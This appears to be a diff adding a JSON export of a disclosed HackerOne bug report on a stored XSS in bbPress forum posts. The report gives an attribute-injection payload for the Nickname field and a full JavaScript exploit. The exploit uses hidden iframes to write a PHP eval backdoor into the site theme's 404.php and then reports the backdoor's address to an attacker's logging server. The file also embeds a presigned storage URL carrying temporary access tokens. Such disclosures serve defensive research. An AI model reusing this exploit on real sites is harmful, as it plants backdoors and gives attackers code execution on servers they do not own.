@@ -1,0 +1,123 @@
+{
+  "id": 151117,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTExMTc=",
+  "url": "https://hackerone.com/reports/151117",
+  "title": "[bbPress] Stored XSS in any forum post.",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-07-13T12:38:02.036Z",
+  "submitted_at": "2016-07-13T12:38:02.036Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "psych0tr1a",
+    "url": "/psych0tr1a",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 111,
+    "url": "https://hackerone.com/automattic",
+    "handle": "automattic",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Automattic",
+      "twitter_handle": "",
+      "website": "https://automattic.com",
+      "about": "WordPress.com, WooCommerce, WordPress VIP, Jetpack, Beeper, Texts, Akismet, Gravatar, Crowdsignal, Tumblr and more!"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2015-5622"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-09-01T09:19:09.900Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-08-02T09:18:41.724Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "#__Intro:__\nEncouraged by the success of cure53 and their reward, i start the research plugins in your scope. And almost immediately i found critical Stored XSS, which of course leeds to privelege escalation or PHP code execution. This vulnerability doesnt requres \"special\" preveleges like [CVE-2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622 \"CVE-2015-5622\"). To demonstrate how this vulnerability elementary for expluatation i write a XSS to Shell exploit.\n\n\n#__Steps to reproduce the XSS:__\n1.  Send any message on topic or start new topic.\n2.  Edit this message.\n3.  Open http://localhost/wordpress/?bbp_user=%YOUR_USER_ID%&edit=1\n4.  Edit your \"Nickname\" to:\n\n\t\tuser1\"onmouseover=\"alert(1);remove()\"style=\"position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px\"\n\n5.  Change your \"Display Name\" to new \"Nickname\", save and return to thread with your message.\n\n#__Screenshot:__\n{F10472} (In attachment)\n\n#__XSS to RCE PoC exploit:__\n\n\t\tvar yourServer = \"%Path to your logger%\"\n\n\t\tvar payload = \"<?php eval($_GET['wp']); ?>\"+\"\\n\";\n\t\tSitePath = document.head.innerHTML.match(/rel=\\\"pingback\\\" href=\\\"(.*?)\\/xmlrpc.php\\\"/m)[1]\n\t\tfunction eas(){ // edit and save\n\t\t\tov = window.frames.win404.document.getElementById('newcontent').value\n\t\t\twindow.frames.win404.document.getElementById('newcontent').value = payload + ov\n\t\t\tdocument.getElementsByName('win404')[0].setAttribute(\"onload\",\"\");\n\t\t\twindow.frames.win404.document.getElementsByName('submit')[0].click()\n\t\t\t((new Image).src=yourServer+\"?message=Check your backdoor here: \"+SitePath+\"/wp-content/themes/\"+themeName+\"/404.php?wp=phpinfo();\")\n\t\t}\n\n\t\tfunction pao(){ // parse and open\n\t\t\tewin = window.frames.editor.contentWindow || window.frames.contentDocument\n\t\t\turl404 = unescape(ewin.document.getElementById('templateside').getElementsByTagName('a')[0].href)\n\t\t        filepar = url404.match(/\\?file\\=(.*?)\\&/m)[1]\n\t\t\tif(filepar.length>10){\n\t\t\t\tthemeName = url404.match(/file\\=\\/themes\\/(.*?)\\//m)[1]\n\t\t\t}\n\t\t\telse{\n\t\t\t\tthemeName = url404.match(/theme\\=(.*?)$/m)[1]\n\t\t\t}\n\t\t\tvar win404 = document.createElement(\"iframe\");\n\t\t\twin404.style.opacity=0\n\t\t\twin404.name = 'win404';\n\t\t\twin404.src = url404\n\t\t\twin404.setAttribute(\"onload\",\"eas();this.onload=''\");\n\t\t\tdocument.body.appendChild(win404);\n\t\t}\n\t\t\n\t\tvar editor = document.createElement(\"iframe\");\n\t\teditor.style.opacity=0\n\t\teditor.name = 'editor';\n\t\teditor.src = SitePath+\"/wp-admin/theme-editor.php\";\n\t\teditor.setAttribute(\"onload\",\"pao();this.onload='';\");\n\t\tdocument.body.appendChild(editor);\n\nBest regards!",
+  "weakness": {
+    "id": 60,
+    "name": "Cross-site Scripting (XSS) - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 104721,
+      "file_name": "bbpress.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/721/43032848e43243665754104fa3a90bc3aa0ff8cb/bbpress.PNG?response-content-disposition=attachment%3B%20filename%3D%22bbpress.PNG%22%3B%20filename%2A%3DUTF-8%27%27bbpress.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H7ZIY45%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T083023Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHPveXPB5yJBkVFNQKDA4Kra8o%2FURxFCExCfu1GHEaW4AiEAlJf9uQnWtEDI4iRVcU%2FSMZbG%2F3HtkhGqIQvQAiQLHvEqsgUIKBADGgwwMTM2MTkyNzQ4NDkiDOBV5dgV2slqZWi8ZyqPBQnHUvzwCX2iXAdA2vCakLNZk4HRuiA2VRvwb6Zbp253nke8fFjiTG6svV8j9k1SfSxbLmkXyQaZq0oy61j%2BDaxzOsxkwuhF1UhOByaXusMghVflXUHdOnYnRFNtXjvBTB38j8K0DbE1j51hBSnFECecPjK9xP9rMVhYj0J%2BH64qVhwgw3JmEiYI%2FDN2mjiIOejoP4IeFJuD8ygxQddcdPRj7XWCiF1hl2AtJWrq1gUbWg5m%2B6lD3wlBFionawUVRVFzEIV3d0PDQfnueNtcHXqhALwbo5htqHTOJhxjOudF61Lje4w%2BQa8hqzR6YDMZ%2BKyxaSV265jIG4HUNJURVxWexrYL1Mm3c0f8u9eUZ%2BTpjFnLy2bGouDmedv%2FwQT2XDHfN5WOtrr3TP6wYrsWkUIi%2Bb1a6DV76HDuFoOwpGQ3iuKCRKqzUb3Rns%2FFYcLL6gmH8vWx%2FuuLFlciXMM8TIfh5M2UBPWp4bVQ60AeG%2F6UstnzK1g1lxAGdrlsTrTtyPUIkIJTmLfPn9nBANxnxIb09EyfuNG3drbtGOSI1YkJeD8p09yIoTkOIxDmW5xO8YXTGWfrzhoVsPuYBicvhJTu5CkkQW1vBCge%2F7rCMC6L%2BsVdNyRRhjPsUqh8PRXrxbf85MNjymrLzMtS4iOVb19CvCdpqUkIGYh2wVOdmqYXTLoF1Gr%2Buoku%2FJShX02S3t7vsLcfKwU1KJ0ta9rfBpsj0IBga8b1Rt9e3ZE5P8z3I%2FiInbPG5Arfy2CeXQMj7bnwV5mHWPk1f5OId6YoSDxOaFFNKXdLxyo9dd0lHswEeHN2uK8y7qPKEiYPhvqreBz8UNT8qH%2BX8h6sbWJYRCaTiSkEixLo4TuDjYO1JvUwufDDxgY6sQFarECmzg0wq532dSKlel9g3DROBQHgmxpQ6kiO7tRKLZEzNKk%2FG0vjgzhxHGSMLRD9ZVFGNvjl%2BAMdpPBU3UF62GCbRl9UCAb%2FenrCDUJ%2BJemLI2htpyxseHRBPrmgwS8xZ47cppNwSbTD8wwIbME4z1N7CKGcu2pOsmPP4DtrMU4lT2YOpQKjgZ5LKlUs66aZPOaVeMEtA29XN6h1wm2kU04cPbHQcDnMTOYCJEr%2F%2FnQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c21bf31fff73b757c33bd7c1c6cb87e4d9503c6f7b5e262442c37e5eb08d3b9c",
+      "file_size": 7570,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-09-01T09:18:41.837Z",
+  "allow_singular_disclosure_after": -285808301.93497974,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "d1m0ck",
+    "bogdantc",
+    "artsploit",
+    "reactors08",
+    "yarbabin",
+    "mdv",
+    "cliantech",
+    "jineesh4k",
+    "need_new_username_103",
+    "rammarj",
+    "and 2 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
